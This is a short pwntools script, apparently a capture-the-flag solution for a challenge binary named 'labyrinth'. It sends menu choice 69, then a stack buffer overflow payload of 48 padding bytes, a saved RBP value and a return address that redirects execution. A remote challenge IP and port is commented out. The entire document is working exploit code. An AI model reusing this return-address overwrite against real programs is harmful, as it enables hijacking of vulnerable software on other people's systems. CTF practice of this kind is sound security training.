from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

offset = 48
rbp = p64(0x7fffffffe1d0)
addr = p64(0x401259)
payload = offset*'A'+rbp+addr

#ip,port = '64.227.41.83',30847
#io = remote(ip,port)
io = process('./labyrinth')

io.recvuntil('>>')
io.sendline('69')
io.recvuntil('>>')
io.sendline(payload)
print io.recvall()
